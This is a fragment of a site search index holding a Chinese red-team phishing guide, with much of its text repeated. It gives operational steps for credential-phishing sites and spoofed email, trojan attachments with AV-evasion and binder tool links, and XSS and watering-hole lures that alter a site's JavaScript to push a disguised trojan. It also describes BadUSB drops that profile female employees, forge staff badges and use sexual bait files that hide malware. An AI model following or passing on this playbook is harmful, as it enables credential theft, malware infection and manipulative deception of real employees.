document.write(\" \");\u6b63\u5e38\u4eba\u4f1a\u53bb\u70b9\u51fb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff0c\u6b64\u65f6\u4f1a\u4e0b\u8f7d\u4f2a\u88c5\u7684\u514d\u6740\u9a6c\u5b50\uff0c\u7136\u540e\u2026\u2026 https://github.com/r00tSe7en/Flash-Pop \u5b9e\u4f8b\u53c2\u8003\uff1a 1\u3001\u8bb0\u4e00\u6b21\u771f\u5b9e\u7684\u90ae\u4ef6\u9493\u9c7c\u6f14\u7ec3 https://xz.aliyun.com/t/5412 \u4e8c\u3001\u9644\u4ef6\u643a\u9a6c\u7c7b \u00b6 \u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff08\u4e0d\u9650\u4e8e\u5e38\u89c1\u90ae\u4ef6\uff0c\u4e00\u4e9b\u5185\u90e8\u7684oa\uff0cerp\uff0c\u6216\u5176\u4ed6\u4f9b\u5458\u5de5 \u4f7f\u7528\u4ea4\u6d41\u5e26\u9644\u4ef6\u529f\u80fd\u7684\u7cfb\u7edf\u4ea6\u53ef\uff09\uff0c\u9644\u4ef6\u643a\u5e26excel\u5b8f\u75c5\u6bd2\uff0c\u6216\u5feb\u6377\u65b9\u5f0f\u7c7b \u6728\u9a6c\uff0c\u4ea6\u6216\u6346\u7ed1\u5728\u6b63\u5e38\u8f6f\u4ef6\u4e2d\u7684\u6728\u9a6c\u7b49\uff0c\u53d1\u9001\u7ed9\u76ee\u6807\uff0c\u7b56\u7565\u548c\u7a83\u53d6\u53e3\u4ee4\u7c7b \u4f3c\u3002\u4e0d\u63a8\u8350excel\u65b9\u5f0f\uff0cwps\u5360\u636e\u4e86\u56fd\u4eba\u5927\u90e8\u5206\u7cfb\u7edf\u3002 \u7ecf\u9a8c\u5206\u4eab\uff1a \u5404\u7c7bOA\u7cfb\u7edf\u7684\u6f0f\u6d1e\u90fd\u88ab\u4fee\u8865\u65e0\u6cd5getshell\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u5b9a\u4e0d\u8981\u653e\u5f03\u5b83 \uff0c\u4f8b\u5982seeyon\uff0c\u4e00\u4e2a\u5f31\u53e3\u4ee4\u8fdbOA\uff0c\u518d\u63d0\u53d6\u5176\u4ed6\u7528\u6237\u7684username\u518d\u8dd1\u4e00\u53d1 \u5f31\u53e3\u4ee4\uff0c\u901a\u8fc7\u6536\u96c6\u7528\u6237\u5e73\u65f6\u5de5\u4f5c\u6765\u5f80\u4fe1\u4ef6\uff0c\u9488\u5bf9\u5176\u4ed6\u4eba\u4e0e\u8be5\u8d26\u53f7\u5e73\u65f6\u7684\u5de5 \u4f5c\u5185\u5bb9\u5236\u5b9a\u8bdd\u672f\uff0c\u5b9a\u5411\u9493\u9c7c\u3002\u4f8b\u5982\u5728\u67d0\u6b21\u7684\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u666e\u901a\u5458 \u5de5\u5f31\u53e3\u4ee4\u8fdb\u5165\u4e86\u8be5\u53f8\u4e00\u4e2a\u5ba2\u670d\u7cfb\u7edf\uff0c\u901a\u8fc7\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u4e0a\u9762\u6709\u7f51\u7ba1\u7528\u6237\u548c \u666e\u901a\u5ba2\u670d\u4eba\u5458\uff0c\u901a\u8fc7\u9644\u4ef6\u643a\u9a6c\u7684\u65b9\u5f0f\u6210\u529f\u9493\u5230\u7ba1\u7406\u5458\uff0c\u5728\u540e\u7eed\u7684\u6df1\u5165\u4e2d\u5c31 \u65b9\u4fbf\u591a\u4e86\u3002 \u514d\u6740\u63a8\u8350\uff1a https://github.com/Rvn0xsy/BadCode https://github.com/1y0n/AV_Evasion_Tool \u6346\u7ed1\u63a8\u8350\uff1a https://github.com/TheKingOfDuck/MatryoshkaDollTool \u5b57\u5178\u63a8\u8350\uff1a https://github.com/sry309/SuperWordlist https://github.com/cwkiller/Pentest_Dic https://github.com/TheKingOfDuck/fuzzDicts \u7cbe\u5f69\u7206\u7834\u6848\u4f8b\uff1a \u4e00\u6b21\u7a0d\u663e\u66f2\u6298\u7684\u7206\u7834\u7ecf\u5386 https://www.cnblogs.com/cwkiller/p/12741086.html \u5176\u4ed6\u63a8\u8350\uff1a \u9c7c\u53c9\u653b\u51fb-\u70ae\u8f70\u9a6c\u7684\u5236\u4f5c https://mp.weixin.qq.com/s/3GLmtGoP-rG1nBBSw_KxkQ \u53d1\u4ef6\u5185\u5bb9\uff1a 1\u3001\u6295\u8bc9\u90ae\u4ef6 2\u3001\u9879\u76ee\u5408\u4f5c 3\u3001\u8d22\u52a1\u901a\u77e5 4\u3001\u6c42\u804c\u90ae\u4ef6 5\u3001\u5b98\u65b9\u901a\u544a 6\u3001\u5185\u90ae\u5185\u5bb9\u56de\u590d 0x02 XSS-Phishing \u00b6 \u4e00\u3001\u7b80\u8ff0 \u00b6 XSS\u653b\u51fb\u901a\u5e38\u6307\u7684\u662f\u901a\u8fc7\u5229\u7528\u7f51\u9875\u5f00\u53d1\u65f6\u7559\u4e0b\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5de7\u5999\u7684\u65b9 \u6cd5\u6ce8\u5165\u6076\u610f\u6307\u4ee4\u4ee3\u7801\u5230\u7f51\u9875\uff0c\u4f7f\u7528\u6237\u52a0\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u8005\u6076\u610f\u5236\u9020\u7684\u7f51\u9875\u7a0b \u5e8f\u3002\u8fd9\u4e9b\u6076\u610f\u7f51\u9875\u7a0b\u5e8f\u901a\u5e38\u662fJavaScript\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u53ef\u4ee5\u5305\u62ecJava\uff0cVB Script\uff0cActiveX\uff0cFlash\u6216\u8005\u751a\u81f3\u662f\u666e\u901a\u7684HTML\u3002\u653b\u51fb\u6210\u529f\u540e\uff0c\u653b\u51fb\u8005\u53ef \u80fd\u5f97\u5230\u66f4\u9ad8\u7684\u6743\u9650\uff08\u5982\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff09\u3001\u79c1\u5bc6\u7f51\u9875\u5185\u5bb9\u3001\u4f1a\u8bdd\u548ccookie\u7b49 \u5404\u79cd\u5185\u5bb9\u3002 \u4e8c\u3001XSS\u9493\u9c7c \u00b6 \u5728hw\u9700\u6c42\u9762\u524d\uff0c\u6ca1\u67090day\uff0c\u627e\u4e0d\u5230\u5165\u53e3\u70b9\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5b89\u6392\u4e00\u540d\u64c5 \u4e8exss\u6316\u6398\u7684\u961f\u5458\u5229\u7528\u6b64\u79cd\u65b9\u5f0f\u3002 \u4f7f\u7528xss\u5f39\u7a97\u63d0\u793a\u9493\u9c7c\u7684\u65f6\u5019\u9762\u4e34\u7684\u95ee\u9898\uff0c\u5982\u679c\u9c7c\u513f\u5df2\u4e0a\u7ebf\uff0c\u8bbf\u95ee\u8005\u8fd8\u4f1a\u6301 \u7eed\u4e0d\u65ad\u7684\u5f39\u7a97\uff0c\u5bb9\u6613\u5f15\u8d77\u9c7c\u513f\u6000\u7591\uff0c \u6743\u9650\u8bf4\u6ca1\u5c31\u6ca1\u4e86\uff0c\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u5e0c\u671b\u770b\u5230\u7684\u7ed3\u679c\u3002 \u53c2\u8003\u6587\u7ae0 XSS\u5b9e\u4f8b\u53ca\u6316\u6398\u65b9\u6cd5 https://www.yuque.com/broken5/blog/vukwsh \u7ea2\u961f\u653b\u9632\u7cfb\u5217\u4e4b\u82b1\u5f0f\u9c7c\u7aff\u9493\u9c7c\u7bc7 https://xz.aliyun.com/t/7958 \u53c2\u8003\u5de5\u5177 XSS-Phishing https://github.com/timwhitez/XSS-Phishing XSS-Fishing2-CS https://github.com/TheKingOfDuck/XSS-Fishing2-CS \u7b56\u7565\u8865\u5145\uff1a\u6b64\u7c7b\u624b\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u8fd0\u7528\u4e8e\u5728\u6316\u5230xss\u65f6\u4f7f\u7528\uff0c\u5728\u6709webshell\u7684\u60c5 \u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u76f8\u5173\u4ee3\u7801\uff0c\u5d4c\u5165js\u6587\u4ef6\u8fdb\u884c\u5bf9\u4e2a\u4ebaPC\u7684\u9493\u9c7c\uff0c\u4f8b\u5982\u67d0\u7c7b \u6709\u8fd0\u7ef4\u7ef4\u62a4\u7684\u7ad9\u70b9\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9493\u8fd0\u7ef4PC\uff0c\u8fd0\u7ef4PC\u4e0a\u7684\u4e1c\u897f\u53ef\u6bd4\u81ea\u5df1\u6253 server\u673a\u6162\u6162\u63a2\u7d22\u6765\u5f97\u8fc5\u901f\u900f\u5f7b\u3002 0x03 BadUsb \u00b6 \u4e00\u3001\u7b80\u8ff0 \u00b6 BadUSB\u662f\u5229\u7528\u4f2a\u9020HID\u8bbe\u5907\u6267\u884c\u653b\u51fb\u8f7d\u8377\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002HID\u8bbe\u5907\u901a\u5e38 \u6307\u7684\u5c31\u662f\u952e\u76d8\u9f20\u6807\u7b49\u4e0e\u4eba\u4ea4\u4e92\u7684\u8bbe\u5907\uff0c\u7528\u6237\u63d2\u5165BadUSB\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c \u9884\u7f6e\u5728\u56fa\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u3002 Bad\ufffeUsb\u63d2\u5165\u540e\uff0c\u4f1a\u6a21\u62df\u952e\u76d8\u9f20\u6807\u5bf9\u7535\u8111\u8fdb\u884c\u64cd\u4f5c\uff0c\u901a\u8fc7\u8fd9\u4e9b\u64cd\u4f5c\u6253\u5f00\u7535\u8111\u7684\u547d \u4ee4\u7ec8\u7aef\uff0c\u5e76\u6267\u884c\u4e00\u6761\u547d\u4ee4\uff0c\u8fd9\u6761\u547d\u4ee4\u5c06\u4ece\u6307\u5b9a\u7f51\u5740\u4e0b\u8f7d\u5176\u4ed6\u4ee3\u7801\u5e76\u4e8e\u540e\u53f0 \u9759\u9ed8\u8fd0\u884c\u3002\u8fd9\u4e9b\u4ee3\u7801\u529f\u80fd\u5305\u62ec\uff1a\u7a83\u53d6\u4fe1\u606f\u3001\u53cd\u5f39shell\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\uff0c\u4ece\u800c \u5b9e\u73b0\u63a7\u5236\u76ee\u6807\u673a\u6216\u8005\u7a83\u53d6\u4fe1\u606f\u7684\u76ee\u7684\u3002 \u4e8c\u3001\u64cd\u4f5c \u00b6 \u8be6\u7ec6\u7684\u5236\u4f5c\u64cd\u4f5c\u8fc7\u7a0b\u4e0d\u518d\u7d2f\u8ff0\uff0c\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0\u3002 BadUSB\u7b80\u5355\u514d\u6740\u4e00\u79d2\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ Badusb\u521d\u8bc6 https://xz.aliyun.com/t/6435 BasUSB\u5b9e\u73b0\u540e\u53f0\u9759\u9ed8\u6267\u884c\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw \u7b56\u7565\u8865\u5145 1\u3001\u6478\u7d22\u5458\u5de5\u4fe1\u606f\uff0c\u4f8b\u5982\u67d0\u4e4e\uff0c\u67d0\u76f4\u8058\uff0c\u5c3d\u4e00\u5207\u4fe1\u606f\u6536\u96c6\u624b\u6bb5\uff0c\u91c7\u96c6\u5458\u5de5\u4fe1 \u606f\uff08\u5973\u6027\u5458\u5de5\u4e3a\u5b9c\uff09\u3002 2\u3001\u67d0\u5b9d\u641c\u7d22\u8d2d\u4e70\u8be5\u53f8\u5458\u5de5\u5de5\u724c\uff0c\u5e76\u5236\u4f5c\u3002 3\u3001\u5236\u4f5cbadusb\uff0c\u5e76\u5c06U\u76d8\u8d34\u4e0a\u4e00\u4e9b\u7b26\u5408\u5973\u6027\u5ba1\u7f8e\u7684\u8d34\u7eb8\u4e4b\u7c7b\uff0c\u5c06\u5176\u6302\u8f7d\u5de5 \u724c\u4e0a\u3002 4\u3001\u4e3a\u4e86\u4fdd\u9669\u8d77\u89c1\uff0c\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u5907\u7528\u65b9\u6848\uff0c\u4f8b\u5982\uff0c\u5229\u7528\u5feb\u6377\u65b9\u5f0f\u7684\u624b\u6cd5\uff0c\u627e \u4e00\u5f20\u7537\u5973\u66a7\u6627\u7684\u56fe\u7247\u7528\u6765\u5236\u4f5c\u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\uff0c\u540d\u5b57\u53d6\u540d\u4e3a\u201c\u521d\u590f\u4e4b\u591c.mp4 \u201d\uff0c\u5c06\u8be5\u6587\u4ef6\u653e\u5728\u540d\u4e3a\u201c\u751c\u871c\u65f6\u523b\u201d\u6587\u4ef6\u5939\u4e0b\uff0c\u6587\u4ef6\u5939\u4e0b\u518d\u653e\u51e0\u5f20\u7f51\u7edc\u201c\u8336\u56fe\u201d\uff0c \u4e0d\u5e26\u8138\u7684\u90a3\u79cd\uff0c\u518d\u8bbe\u7f6e\u4e00\u4e2a\u9690\u85cf\u5c5e\u6027\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5b58\u653e\u81ea\u5df1\u7684\u514d\u6740\u9a6c\u3002 Attrib +s +a +h +r \u547d\u4ee4\u4ecb\u7ecd\uff1a \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027ATTRIB[+R|-R][+A|-A][+S|-S][+H|- H][[drive:][path]filename][/S[/D]]+\u8bbe\u7f6e\u5c5e\u6027\uff1b- \u6e05\u9664\u5c5e\u6027\uff1bR\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\uff1bA\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\uff1bS\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\uff1bH\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\uff1b \u73b0\u5728\uff0c\u6211\u4eec\u628a\u8fd9\u4e2aU\u76d8+\u5de5\u724c\u4f2a\u9020\u6210\u4e86\u67d0\u4e00\u4e2a\u5973\u6027\u5458\u5de5\u7684\u7269\u54c1\uff0c\u5e76\u5728\u5176\u4e2d\u5b58 \u653e\u4e86\u4e00\u4e9b\u4ee4\u4eba\u611f\u5174\u8da3\u7684\u4e1c\u897f\uff0c\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u5c06\u5176\u6295\u653e\u5728\u8be5\u53f8\u67d0\u4e00\u4e2a\u5730\u65b9 \uff0c\u88ab\u5458\u5de5\u62fe\u9057\uff0c\u4f1a\u51fa\u73b0\u4ec0\u4e48\u6837\u7684\u60c5\u51b5\u3002\u3002\u3002 \u53c2\u8003\u94fe\u63a5 \u65b0\u578b\u8fdc\u63a7\u6728\u9a6c\u4e0a\u6f14\u79fb\u5f62\u6362\u5f71\u5927\u6cd5 https://www.freebuf.com/articles/system/138164.html Windows\u768412\u79cd\u5feb\u6377\u65b9\u5f0f https://www.cnblogs.com/bkclover/p/4228441.html \u7ea2\u961f\u6d3b\u52a8\u4e4bLnk\u6837\u672c\u8f7d\u8377\u7bc7 https://mp.weixin.qq.com/s/ZbtGJAT-SyZ50LRNOCg14w 0x04 \u5c0f\u6280\u5de7\u6f14\u793a \u00b6 \u4e00\u3001\u9644\u4ef6\u643a\u9a6c \u4e8c\u3001\u6346\u7ed1\u643a\u9a6c \u8bf4\u660e\uff1a\u4ee5\u4e0a\u6240\u6f14\u793a\u7684\u4e24\u79cd\u5b9e\u73b0\u5747\u662f\u4ece\u672c\u6587\u6240\u5217\u4e3e\u7684\u5185\u5bb9\u7ecf\u8fc7\u7ec4\u5408\u4fee\u6539\u6d4b\u8bd5 \u800c\u6210\uff0c\u4e0d\u5177\u6709\u591a\u5c11\u6280\u672f\u542b\u91cf\u3002 0x05 \u6700\u540e \u00b6 \u793e \u5de5 \u51e0 \u4e2a \u57fa \u7840 \u70b9 \uff1a 1 \u3001 \u4fe1 \u606f \u6536 \u96c6 2 \u3001 \u7ed8 \u5236 \u4eba \u7269 \u753b \u50cf 3\u3001\u6307\u5b9a\u6218\u672f\u3002\u5728\u5b9e\u6218\u4e2d\u5e94\u5c06\u793e\u5de5\u9493\u9c7c\u878d\u5165\u6e17\u900f\u7684\u5404\u4e2a\u73af\u8282\u3002\u9ad8\u8d28\u91cf\u7684\u9488\u5bf9 \u67d0\u7c7b\u4e2a\u4f53\u9493\u9c7c\u5f80\u5f80\u6bd4\u6279\u91cf\u6d77\u9493\u7684\u6548\u679c\u6765\u7684\u66f4\u51fa\u8272\u3002 \u4e00\u7bc7\u7cbe\u5f69\u7684\u5b9e\u4f8b\u793e\u5de5 \u53cd\u8bc8\u6848\u4f8b|\u8bc8\u9a97\u56e2\u4f19\u5192\u5145\u9886\u5bfc\u5f00\u53e3\u5c31\u898198w https://mp.weixin.qq.com/s/KL6O6fqeKWue81VZTiYAFA \u9644\u4e0a\u53f2\u4e0a\u6700\u52a8\u542c\u6700\u7ecf\u5178\u7684\u539f\u7248\u97f3\u9891\uff1a\u6709\u4e3b\u673a\u4e0a\u7ebf\u8bf7\u6ce8\u610f \u7cbe\u9009\u7559\u8a00 \u7528\u6237\u8bbe\u7f6e\u4e0d\u4e0b\u8f7d\u8bc4\u8bba","title":"\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x01","text":"","title":"0x01 \u90ae\u4ef6\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_1","text":"\u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff0c\u6b3a\u9a97\u6536\u4ef6\u4eba\u5c06\u8d26\u53f7\u3001\u53e3\u4ee4\u7b49\u4fe1\u606f\u56de\u590d\u7ed9\u6307\u5b9a\u7684\u63a5\u6536\u8005 \uff1b\u6216\u5f15\u5bfc\u6536\u4ef6\u4eba\u8fde\u63a5\u5230\u7279\u5236\u7684\u7f51\u9875\uff0c\u8fd9\u4e9b\u7f51\u9875\u901a\u5e38\u4f1a\u4f2a\u88c5\u6210\u548c\u771f\u5b9e\u7f51\u7ad9\u4e00 \u6837\uff0c\u5982\u94f6\u884c\u6216\u7406\u8d22\u7684\u7f51\u9875\uff0c\u4ee4\u767b\u5f55\u8005\u4fe1\u4ee5\u4e3a\u771f\uff0c\u8f93\u5165\u4fe1\u7528\u5361\u6216\u94f6\u884c\u5361\u53f7\u7801 \u3001\u8d26\u6237\u540d\u79f0\u53ca\u5bc6\u7801\u7b49\u800c\u88ab\u76d7\u53d6\u3002 \u7b56\u7565\u8bf4\u660e\uff1a 1\u3001\u642d\u5efa\u9493\u9c7c\u7ad9\u9700\u8003\u8651\u65f6\u95f4\u6210\u672c\u548c\u961f\u4f0d\u7684\u4ee3\u7801\u529f\u5e95\u7b49\u5404\u79cd\u56e0\u7d20\uff0c\u4f7f\u7528Spoof Web\u548csetoolkit\u901f\u5ea6\u6700\u5feb\uff0chttrack\u4eff\u771f\u5ea6\u6700\u9ad8\uff0c\u4f46\u662f\u8981\u8bb0\u5f55\u8bbf\u95ee\u8005\u7684\u8f93\u5165 \u9700\u8981\u4fee\u6539\u76f8\u5173\u6587\u4ef6\uff0c\u6210\u672c\u8f83\u9ad8\u3002 2\u3001\u901a\u8fc7Swaks\u4f2a\u9020\u90ae\u4ef6\uff08\u6216\u5176\u4ed6\u65b9\u5f0f\uff09\u53d1\u9001\u793e\u5de5\u90ae\u4ef6\uff08\u6279\u91cf\u6216\u5b9a\u5411\uff09\u3002 3\u3001\u51e0\u4e2a\u91cd\u8981\u56e0\u7d20\uff1a\u4eff\u9020\u7684\u7ad9\u70b9\u76ee\u6807\u3001\u76ee\u6807\u4eba\u7fa4\u3001\u8bdd\u672f\u3002\u6f02\u4eae\u7684\u6218\u672f\u5236\u5b9a\u5f80 \u5f80\u6bd4\u6280\u672f\u70b9\u7684\u6289\u62e9\u66f4\u91cd\u8981\u3002\u4f8b\u598219\u5e74\u5e95\u5230\u73b0\u5728\u76db\u884c\u7684\u88f8\u804a\u8bc8\u9a97\u5957\u8def\uff0c\u901a\u8fc7 \u4eba\u6027\u7684\u5f31\u70b9\uff0c\u6548\u679c\u663e\u8457\u3002\u518d\u4f8b\u5982\u51e0\u4e2a\u6708\u524d\u7684\u67d0\u6b21\u6f14\u7ec3\uff0c\u67d0\u53f8\u961f\u4f0d\u901a\u8fc7\u53cd\u4ee3 \u9493\u9c7c\u7684\u624b\u6cd5\uff0c\u6210\u529f\u7684\u62ff\u5230\u4e86\u76ee\u6807\u7684\u7c7b\u4f3c\u4e91\u4e3b\u673a\u7ba1\u7406\u7cfb\u7edf\u7684web\u8d26\u53f7\u5bc6\u7801\uff0c\u63a5 \u7ba1\u4e00\u5806\u865a\u62df\u4e91\u4e3b\u673a\u3002 \u642d\u5efa\u9493\u9c7c\u7f51\u7ad9\u76f8\u5173\u53c2\u8003\uff1a 1\u3001\u4e00\u952e\u90e8\u7f72HTTPS\u9493\u9c7c\u7ad9 https://github.com/klionsec/SpoofWeb 2\u3001nginx\u505a\u53cd\u5411\u4ee3\u7406-\u9493\u9c7c https://www.cnblogs.com/R4v3n/articles/8460811.html 3\u3001\u514b\u9686\u7f51\u7ad9\u795e\u5668httrack https://github.com/xroche/httrack 4\u3001\u793e\u4f1a\u5de5\u7a0b\u5b66\u5de5\u7a0b\u5305 https://github.com/trustedsec/social-engineer-toolkit 5\u3001setoolkit\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 https://www.cnblogs.com/zhangb8042/articles/10910019.html 6\u3001flash\u7684\u9493\u9c7c\u9875 https://github.com/r00tSe7en/Fake-flash.cn \u90ae\u4ef6\u4f2a\u9020\u53c2\u8003\uff1a 1\u3001Swaks\u4f2a\u9020\u90ae\u4ef6 https://payloads.online/archivers/2019-05-09/1 2\u3001Swaks - Swiss Army Knife for SMTP http://www.jetmore.org/john/code/swaks/ 3\u3001CobaltStrike \u751f\u6210Office\u5b8f\u75c5\u6bd2\u8fdb\u884c\u9493\u9c7c\u653b\u51fb Office\u5b8f\u75c5\u6bd2\u6df7\u6dc6\u514d\u6740- EvilClippy CobaltStrike \u751f\u6210exe\u6728\u9a6c\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u514d\u6740\uff1a \u514d\u6740\u53ef\u4ee5\u7528 https://github.com/1y0n/AV_Evasion_Tool \u8fd8\u6ca1\u88ab\u548c\u8c10\u592a\u591a \u6df7\u6dc6\uff1a https://jishuin.proginn.com/p/763bfbd60aa3 CobaltStrike \u751f\u6210shellcode\u8fdb\u884c\u514d\u6740\u4e0a\u7ebf 4\u3001\u6c34\u5751\u653b\u51fb-Flash\u4f2a\u88c5 \u5047\u8bbe\u5df2\u7ecf\u62ff\u5230\u4e00\u53f0\u5185\u7f51web\u5728\u7528\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u4e0a\u4f20\u4f2a\u88c5\u514d\u6740\u9a6c\u5b50\u548c\u7279\u5b9ajs\uff0c\u5047\u8bbe\u627e\u5230\u7ad9\u70b9all.js\u6587\u4ef6\uff0c\u70b9\u51fb\u7f16\u8f91\u4fee\u6539 document.write(\" \");\u6b63\u5e38\u4eba\u4f1a\u53bb\u70b9\u51fb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff0c\u6b64\u65f6\u4f1a\u4e0b\u8f7d\u4f2a\u88c5\u7684\u514d\u6740\u9a6c\u5b50\uff0c\u7136\u540e\u2026\u2026 https://github.com/r00tSe7en/Flash-Pop \u5b9e\u4f8b\u53c2\u8003\uff1a 1\u3001\u8bb0\u4e00\u6b21\u771f\u5b9e\u7684\u90ae\u4ef6\u9493\u9c7c\u6f14\u7ec3 https://xz.aliyun.com/t/5412","title":"\u4e00\u3001\u7a83\u53d6\u53e3\u4ee4\u7c7b"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_2","text":"\u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff08\u4e0d\u9650\u4e8e\u5e38\u89c1\u90ae\u4ef6\uff0c\u4e00\u4e9b\u5185\u90e8\u7684oa\uff0cerp\uff0c\u6216\u5176\u4ed6\u4f9b\u5458\u5de5 \u4f7f\u7528\u4ea4\u6d41\u5e26\u9644\u4ef6\u529f\u80fd\u7684\u7cfb\u7edf\u4ea6\u53ef\uff09\uff0c\u9644\u4ef6\u643a\u5e26excel\u5b8f\u75c5\u6bd2\uff0c\u6216\u5feb\u6377\u65b9\u5f0f\u7c7b \u6728\u9a6c\uff0c\u4ea6\u6216\u6346\u7ed1\u5728\u6b63\u5e38\u8f6f\u4ef6\u4e2d\u7684\u6728\u9a6c\u7b49\uff0c\u53d1\u9001\u7ed9\u76ee\u6807\uff0c\u7b56\u7565\u548c\u7a83\u53d6\u53e3\u4ee4\u7c7b \u4f3c\u3002\u4e0d\u63a8\u8350excel\u65b9\u5f0f\uff0cwps\u5360\u636e\u4e86\u56fd\u4eba\u5927\u90e8\u5206\u7cfb\u7edf\u3002 \u7ecf\u9a8c\u5206\u4eab\uff1a \u5404\u7c7bOA\u7cfb\u7edf\u7684\u6f0f\u6d1e\u90fd\u88ab\u4fee\u8865\u65e0\u6cd5getshell\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u5b9a\u4e0d\u8981\u653e\u5f03\u5b83 \uff0c\u4f8b\u5982seeyon\uff0c\u4e00\u4e2a\u5f31\u53e3\u4ee4\u8fdbOA\uff0c\u518d\u63d0\u53d6\u5176\u4ed6\u7528\u6237\u7684username\u518d\u8dd1\u4e00\u53d1 \u5f31\u53e3\u4ee4\uff0c\u901a\u8fc7\u6536\u96c6\u7528\u6237\u5e73\u65f6\u5de5\u4f5c\u6765\u5f80\u4fe1\u4ef6\uff0c\u9488\u5bf9\u5176\u4ed6\u4eba\u4e0e\u8be5\u8d26\u53f7\u5e73\u65f6\u7684\u5de5 \u4f5c\u5185\u5bb9\u5236\u5b9a\u8bdd\u672f\uff0c\u5b9a\u5411\u9493\u9c7c\u3002\u4f8b\u5982\u5728\u67d0\u6b21\u7684\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u666e\u901a\u5458 \u5de5\u5f31\u53e3\u4ee4\u8fdb\u5165\u4e86\u8be5\u53f8\u4e00\u4e2a\u5ba2\u670d\u7cfb\u7edf\uff0c\u901a\u8fc7\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u4e0a\u9762\u6709\u7f51\u7ba1\u7528\u6237\u548c \u666e\u901a\u5ba2\u670d\u4eba\u5458\uff0c\u901a\u8fc7\u9644\u4ef6\u643a\u9a6c\u7684\u65b9\u5f0f\u6210\u529f\u9493\u5230\u7ba1\u7406\u5458\uff0c\u5728\u540e\u7eed\u7684\u6df1\u5165\u4e2d\u5c31 \u65b9\u4fbf\u591a\u4e86\u3002 \u514d\u6740\u63a8\u8350\uff1a https://github.com/Rvn0xsy/BadCode https://github.com/1y0n/AV_Evasion_Tool \u6346\u7ed1\u63a8\u8350\uff1a https://github.com/TheKingOfDuck/MatryoshkaDollTool \u5b57\u5178\u63a8\u8350\uff1a https://github.com/sry309/SuperWordlist https://github.com/cwkiller/Pentest_Dic https://github.com/TheKingOfDuck/fuzzDicts \u7cbe\u5f69\u7206\u7834\u6848\u4f8b\uff1a \u4e00\u6b21\u7a0d\u663e\u66f2\u6298\u7684\u7206\u7834\u7ecf\u5386 https://www.cnblogs.com/cwkiller/p/12741086.html \u5176\u4ed6\u63a8\u8350\uff1a \u9c7c\u53c9\u653b\u51fb-\u70ae\u8f70\u9a6c\u7684\u5236\u4f5c https://mp.weixin.qq.com/s/3GLmtGoP-rG1nBBSw_KxkQ \u53d1\u4ef6\u5185\u5bb9\uff1a 1\u3001\u6295\u8bc9\u90ae\u4ef6 2\u3001\u9879\u76ee\u5408\u4f5c 3\u3001\u8d22\u52a1\u901a\u77e5 4\u3001\u6c42\u804c\u90ae\u4ef6 5\u3001\u5b98\u65b9\u901a\u544a 6\u3001\u5185\u90ae\u5185\u5bb9\u56de\u590d","title":"\u4e8c\u3001\u9644\u4ef6\u643a\u9a6c\u7c7b"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x02-xss-phishing","text":"","title":"0x02 XSS-Phishing"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_3","text":"XSS\u653b\u51fb\u901a\u5e38\u6307\u7684\u662f\u901a\u8fc7\u5229\u7528\u7f51\u9875\u5f00\u53d1\u65f6\u7559\u4e0b\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5de7\u5999\u7684\u65b9 \u6cd5\u6ce8\u5165\u6076\u610f\u6307\u4ee4\u4ee3\u7801\u5230\u7f51\u9875\uff0c\u4f7f\u7528\u6237\u52a0\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u8005\u6076\u610f\u5236\u9020\u7684\u7f51\u9875\u7a0b \u5e8f\u3002\u8fd9\u4e9b\u6076\u610f\u7f51\u9875\u7a0b\u5e8f\u901a\u5e38\u662fJavaScript\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u53ef\u4ee5\u5305\u62ecJava\uff0cVB Script\uff0cActiveX\uff0cFlash\u6216\u8005\u751a\u81f3\u662f\u666e\u901a\u7684HTML\u3002\u653b\u51fb\u6210\u529f\u540e\uff0c\u653b\u51fb\u8005\u53ef 